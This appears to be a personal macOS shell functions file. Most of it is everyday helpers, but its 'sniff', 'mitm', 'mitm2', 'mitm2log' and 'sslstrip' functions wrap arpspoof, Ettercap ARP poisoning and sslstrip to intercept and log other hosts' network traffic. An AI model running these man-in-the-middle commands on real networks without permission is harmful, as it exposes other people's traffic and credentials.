#####
##### Functions
#####


###
### Open a website in Chrome
###
chrome() {
    open -a "Google Chrome" "http://"$1""
}

###
### Show n most recent downloaded files
###

recent() {

    if [ -z "$1" ]
        then
            ls -lat | head -n 20
        else
            ls -lat | head -n "$1" 
        return
    fi
}


###
### Check if something's running without typing out that whole ps awx business
###

running() {

    if [ -z "$1" ]
        then
            echo "Usage: running <process name>"
            echo "Original command: ps awx | grep <process name>"
        else
            ps awx | grep "$1"
        return
    fi
}

###
### Enable/disable IP forwarding
###

function ipf() {

    ipf=`sudo sysctl -a net.inet.ip.forwarding | cut -d ':' -f 2`

    if [ $ipf -eq 0 ]; then
        sudo sysctl -w net.inet.ip.forwarding=1
    else
        sudo sysctl -w net.inet.ip.forwarding=0
    fi
}

###
### Sniff with Ettercap
###

function sniff() {

    if [ -z "$1" ]
        then
            echo "Usage: sniff <interface>
            
For more control, tweak this command accordingly:
    sudo ettercap -T -q -i <interface> /ip/port /ip/port

e.g. sudo ettercap -T -q -i en1 /192.168.1.1/80 //
    This example would sniff the host 192.168.1.1 on port 80 over wireless for connections going to any other IP
            "
        else
            sudo sysctl -w net.inet.ip.forwarding=1
            sudo ettercap -Tqi "$1" -P "autoadd" /"$2"/ /"$3"/
            sudo sysctl -w net.inet.ip.forwarding=0
        return
    fi
}

###
### Use arpspoof to initiate MITM attack
###

function mitm() {

    function cleanup {
        echo "Setting IP forwarding to 0"
        sudo sysctl -w net.inet.ip.forwarding=0
        echo "IP forwarding is "+`sudo sysctl -a net.inet.ip.forwarding | cut -d ':' -f 2`
        echo "Clearing modified ipfw rules"
        sudo ipfw -q flush
    }

    if [ -z "$1" ]
        then
            echo "Usage: mitm <interface> <target> <gateway>"
        else
            echo "
            ###########################
            #                         #
            # If running mitm causes  #
            # wireshark to stop       #
            # detecting  interfaces,  #
            # run:                    #
            #                         #
            # sudo chmod 644 /dev/bpf #
            #                         #
            # These may be useful:    #
            #                         #
            # sudo pfctl -vvv -f /etc/#
            # pf.conf -E | tail -n 2 |#
            # cut -d \"\@\" -f 2        #
            #                         #
            # sudo pfctl -d           #
            #                         #
            ###########################



            ###################
            #                 #
            #    Preflight    #
            #                 #
            ###################
            "
            #echo "Forwarding all SSL traffic on port 443 to port 10000"
            #sudo ipfw add fwd 127.0.0.1,443 tcp from any to any dst-port 10000 #in via en1
            #echo `sudo ipfw -at list`"\n\n"
            echo "Setting IP forwarding to 1"
            sudo sysctl -w net.inet.ip.forwarding=1
            echo "IP forwarding is now"`sudo sysctl -a net.inet.ip.forwarding | cut -d ':' -f 2`
            echo "
            ###################
            #                 #
            #    Beginning    #
            #      Spoof      #
            #                 #
            ###################
            " 
            echo "starting arpspoof session on $1 against $2 sending and receiving traffic through $3"
            if [ -z $3 ]
                then
                    echo "Starting arpspoof session on $1 against $2 sending and receiving traffic on 192.168.1.1"
                    sudo arpspoof -i "$1" -t "$2" 192.168.1.1
                else
                    echo "starting arpspoof session on $1 against $2 sending and receiving traffic through $3"
                    sudo arpspoof -i "$1" -t "$2" "$3"
            fi
            echo "
            ###################
            #                 #
            #     Cleanup     #
            #                 #
            ###################
            "
            echo "Setting IP forwarding to 0"
            sudo sysctl -w net.inet.ip.forwarding=0
            echo "IP forwarding is now"`sudo sysctl -a net.inet.ip.forwarding | cut -d ':' -f 2`"\n\n"
            #echo "Flushing ipfw routing list"
            #sudo ipfw -q flush
            #echo `sudo ipfw -at list`
            echo "Killing lingering arpspoof sessions"
            sudo killall arpspoof
            echo "\n\n"
            echo "If this list has more than one entry, kill the lingering arpspoof sessions:"
            echo `ps awx | grep arpspoof`
            echo "####### END #######"
        return
    fi
}

###
### Initiate Ettercap MITM attack
###

function mitm2() {

    if [ -z "$1" ]
        then
            echo "Usage: mitm <interface> <host1 (optional)> <host2 (optional)>
            
For more control, tweak this command accordingly:
    sudo ettercap -T -q -i <interface> -M ARP<flags> /ip/port /ip/port

e.g. sudo ettercap -T -q -i en1 -M arp:remote /192.168.1.1/ //80
    This example would perform a MITM attack on 192.168.1.1 on port 80 over wireless for connections going to any other IP
            "
        else
            ipfwd=`sudo sysctl -a net.inet.ip.forwarding`
            echo "Current value of $ipfwd"
            echo "
##############################################################
# Make sure to set:                                          #
#                                                            #
# sudo sysctl -w net.inet.ip.forwarding=1                    #
#                                                            #
# Use 'ipf' command to toggle                                #
#                                                            #
##############################################################"
                  #
            hrf="/Users/sboynton/scripts/hrf.ef"
            #sudo ettercap -T -q -F $hrf -i "$1" -M arp:remote // //
            #sudo ettercap -T -S -q -P "autoadd" -i "$1" -a "/usr/local/etc/ettercap/etter.conf" -M arp:remote /"$2"/ /"$3"/
            sudo ettercap -T -S -V "ascii" -q -P "autoadd" -i "$1" -M arp:remote /"$2"/ /"$3"/
            # Reset IP forwarding on close
            sudo sysctl -w net.inet.ip.forwarding=0
            echo "Killing lingering ettercap sessions"
            sudo killall ettercap
            echo "\n\n"
            echo "If this list has more than one entry, kill the lingering ettercap sessions:"
            echo `ps awx | grep ettercap`
            echo "####### END #######"
        return
    fi
}

###
### Initiate Ettercap MITM attack
###

function mitm2log() {

    if [ -z "$1" ]
        then
            echo "Usage: mitm <interface>
            
For more control, tweak this command accordingly:
    sudo ettercap -T -q -i <interface> -M ARP<flags> /ip/port /ip/port -L <logfile>

e.g. sudo ettercap -T -q -i en1 -M arp:remote /192.168.1.1/ //80 -L log
    This example would perform a MITM attack on 192.168.1.1 on port 80 over wireless for connections going to any other IP, and output the log file to a file called 'log'
            "
        else
            DATE="/Users/sboynton/Documents/Ettercap Logs/etterlog-"`date +"%d-%m-%Y"`"_"`date +"%H-%M-%S"`".log"
            sudo ettercap -T -q -i "$1" -M arp:remote // // -w $DATE
        return
        chmod +x $DATE
    fi
}

###
### Enable/disable sslstrip and associated system paramters
###

function sslstrip() {

#    list=("")

    function cleanup {
#        echo "Disabling IP forwarding"
#        list=${list[@]}
#        for item in list
#            do
#                sudo ipfw delete "$item"
#                echo "Deleting ipfw rule $item"
#            done
        sudo sysctl -w net.inet.ip.forwarding=0
        sudo sysctl -w net.inet.ip.fw.enable=1
        sudo sysctl -w net.inet.ip.fw.verbose=2
    }


    if [ -z "$1" ]
        then
            python ~/scripts/sslstrip-0.9/sslstrip.py -h
        else
#            echo "Enabling IP forwarding"
#            list=$list
#            for item in list
#                do
#                    item=$RANDOM
#                    list[$item]=("${list[@]}", "$item")
#                    echo "$item"
#                    sudo ipfw add "$item" fwd 127.0.0.1,10000 tcp from any to any 80
#                done

            #sudo sysctl -w net.inet.ip.forwarding=1
            #sudo sysctl -w net.inet.ip.fw.enable=1
            #sudo sysctl -w net.inet.ip.fw.verbose=1

            python ~/scripts/sslstrip-0.9/sslstrip.py
        return
        #trap cleanup EXIT
    fi
    }

###
### Enable/disable ARP forwarding
###
function arpforward() {
    if [ -z "$1" ]
        then
            echo "Usage: arpforward <1=on, 0=off>"
        return
    fi

    sudo sysctl -w net.inet.ip.forwarding="$1"
}

###
### Scan local network for devices
###

function arpscan() {
    if [ -z "$1" ]
        then
            echo "Usage: arpscan <interface>"
        return
    fi

    sudo arp-scan --localnet --interface="$1"
}

###
### Extract major filetypes with one command
###

function extract()      # Handy Extract Program
{
    if [ -f $1 ] ; then
        case $1 in
            *.tar.bz2)   tar xvjf $1     ;;
            *.tar.gz)    tar xvzf $1     ;;
            *.bz2)       bunzip2 $1      ;;
            *.rar)       unrar x $1      ;;
            *.gz)        gunzip $1       ;;
            *.tar)       tar xvf $1      ;;
            *.tbz2)      tar xvjf $1     ;;
            *.tgz)       tar xvzf $1     ;;
            *.zip)       unzip $1        ;;
            *.Z)         uncompress $1   ;;
            *.7z)        7z x $1         ;;
            *)           echo "'$1' cannot be extracted via >extract<" ;;
        esac
    else
        echo "'$1' is not a valid file!"
    fi
}

###
### Make archives easily
###

# Creates an archive (*.tar.gz) from given directory.
function maketar() { tar cvzf "${1%%/}.tar.gz"  "${1%%/}/"; }

# Create a ZIP archive of a file or folder.
function makezip() { zip -r "${1%%/}.zip" "$1" ; }

###
### Use lynx with grep, cat to file
###

function lgrep() { # Capture Lynx recursive pattern search to file
	if [ -z "$1" ]
	then
		echo "Usage: lgrep <filename> <http://url> <pattern>"
	return
	fi

	output=""
	url=""
	grep=""

	for f in $1; do
		output="$f"
	done

	for a in $2; do
		url="$a"
	done

	for g in $3; do
		grep="$g"
	done

	vars=($output $url $grep)

	#echo ${vars[0]}
	#echo ${vars[1]}
	#echo ${vars[2]}

	lynx -source ${vars[1]} -crawl | grep ${vars[2]} | cat > ${vars[0]}
	echo
}

###
### Find files by name
###

function ff() { find . -type f -iname '*'"$*"'*' -ls ; }

###
### Search Google by typing google (search term), quotes not necessary around search terms
###

google() {
	search=""
	echo="$1"
	for term in $*; do
		search="$search%20$term"
	done
	open -g "http://www.google.com/search?q=$search"
}

###
### Quit an application cleanly by writing quit (application name)
###

quit() {
	for app in $*; do
		osascript -e 'quit app "'$app'"'
	done
}

###
### Use mdfind -name (filename) without having to type it all out
###

mdf() {
	for name in $*; do
		mdfind -name $name
	done
}

url() {
	for url in $*; do
		open -g http://www.$url
	done
}

###
### Use the "tree" command (obtained via MacPorts) with user input on the level of depth of the tree
###

treelvl() {
	var="$1"
	if [ -z $var ]
	    then
	        var="1"
	fi
	tree -aCL $var	
	echo
}

function mydf()         # Pretty-print of 'df' output.
{                       # Inspired by 'dfc' utility.
    for fs ; do

        if [ ! -d $fs ]
        then
          echo -e $fs" :No such file or directory" ; continue
        fi

        local info=( $(command df -P $fs | awk 'END{ print $2,$3,$5 }') )
        local free=( $(command df -Pkh $fs | awk 'END{ print $4 }') )
        local nbstars=$(( 20 * ${info[1]} / ${info[0]} ))
        local out="["
        for ((j=0;j<20;j++)); do
            if [ ${j} -lt ${nbstars} ]; then
               out=$out"*"
            else
               out=$out"-"
            fi
        done
        out=${info[2]}" "$out"] ("$free" free on "$fs")"
        echo -e $out
    done
}

###
### Network functions
###

function my_ip() # Get IP adress on ethernet.
{
    MY_IP=$(/sbin/ifconfig en1 | awk '/inet/ { print $2 } ' |
      sed -e s/addr://)
    echo ${MY_IP:-"Not connected"}
}

function iii()   # Get current host related info.
{
    echo -e "\nYou are logged on $HOSTNAME"
    echo -e "\nAdditional information:$NC " ; uname -a
    echo -e "\nUsers logged on:$NC " ; w -hi |
             cut -d " " -f1 | sort | uniq
    echo -e "\nCurrent date :$NC " ; date
    echo -e "\nMachine stats :$NC " ; uptime
    echo -e "\nDiskspace :$NC " ; mydf / $HOME
    echo -e "\nLocal IP Address :$NC" ; my_ip
    echo -e "\nPublic IP Address:$NC" ; dig +short myip.opendns.com @resolver1.opendns.com 
    echo -e "\nOpen TCP connections :$NC "; netstat | grep tcp4 ;
    echo
}

function renameall()    # Rename all files in a folder
{
    read -r "?Would you like to (a)dd or (r)emove? " choice

    function addext() {
        rename -g 's/\.'$ext'/'$add'\.'$ext'/' *.$ext
    }

    function remext() {
        rename -g 's/'$rem'\.'$ext'/.'$ext'/' *.$ext
    }
    case $choice in
        a ) read -r "?Add the following to the filename: " add
            case $add in
                [^\r\n]* ) read -r "?Enter the filetype to change (e.g. jpg): " ext
                    case $ext in
                    [^\r\n]* ) echo "Adding $add to files of type $ext" ; addext ;;
                    * )      echo "Please enter a file type!" ;;
                    esac
                    ;;
                * ) echo "Please enter something to add!" ;;
            esac
            ;;
        r ) read -r "?Remove the following from the filename: " rem
            case $add in 
                [^\r\n]* ) read -r"?Enter the filetype to change (e.g. jpg): " ext
                    case $ext in 
                    [^\r\n]* ) echo "Removing $rem from files of type $ext" ; remext ;;
                    * )      echo "Please enter a file type!" ;;
                    esac
                    ;;
                * ) echo "Please enter something to remove!" ;;
            esac
            ;;
        * ) echo "Please make a selection!"
    esac
}

#function scrot() {      # Emulate the scrot command on Linux, but with some better defaults
#    read -r "?Enter filename (leave blank for default): " filename
#    case $filename in
#        [^\r\n]* ) echo "Taking screenshot in 3...2...1..."; sleep 3; screencapture "/Users/sboynton/Desktop/$filename.png" ;;
#        * ) echo "Taking screenshot in 3...2...1..."; sleep 3; screencapture "/Users/sboynton/Desktop/Screenshot_`date | cut -d' ' -f1-3 | sed 's/ /-/g'`_`date | cut -d' ' -f4 | sed 's/:/-/g'`.png" ;;
#    esac
#}

function ncdu-function() {
    if [ -z "$1" ]; then
        ncdu -x /
    else
        ncdu -x "$1"
    fi
}

###
### wget recursively for arbitrary filetypes
###

function wgetr() {
    EXPECTED_ARGS=2
    E_BADARGS=65

    if [ $# -ne $EXPECTED_ARGS ]; then
        echo "Usage: `basename $0` {filetype[s]} {url}"
        echo "Filetypes may be comma separated, e.g. jpg,jpeg,png"
        echo ""
    fi
    
    wget -r -A $1 $2

}

###
### USE WITH CAUTION
###

function git-cleanup() {
    cd `brew --prefix`
    sudo git remote add origin https://github.com/mxcl/homebrew.git
    sudo git fetch origin
    sudo git reset --hard origin/master
}

###
### Add SSH key to any server
###

function add-ssh-key() {
    EXPECTED_ARGS=1
    E_BADARGS=65

    if [ $# -ne $EXPECTED_ARGS ]; then
        echo "Usage: `basename $0` {user@host}"
        echo "E.g. add-ssh-key root@192.168.254.23"
        echo ""
    else
        ssh-copy-id -i $HOME/.ssh/id_dsa.pub "$1"
    fi
}

###
### Use GNU ls in OS X (gls) or fall back to ls if not found
###

function gnuls() {
    if hash gls 2>/dev/null; then
        gls --color "$@"
    else
        ls --color "$@"
    fi
}
